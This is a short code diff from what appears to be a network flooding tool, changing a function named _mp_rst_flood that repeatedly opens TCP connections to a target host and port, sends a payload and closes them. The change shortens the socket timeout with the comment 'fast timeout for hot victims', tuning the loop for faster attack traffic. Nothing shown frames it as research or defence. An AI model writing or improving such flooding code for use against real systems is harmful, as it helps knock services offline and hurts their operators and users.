@@ -737,7 +737,7 @@ def _mp_rst_flood(args_tuple):
     while _time.time() < end:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2.0)
+            s.settimeout(0.5)  # fast timeout for hot victims
             s.connect((host, port))
             s.send(payload)
             s.close()
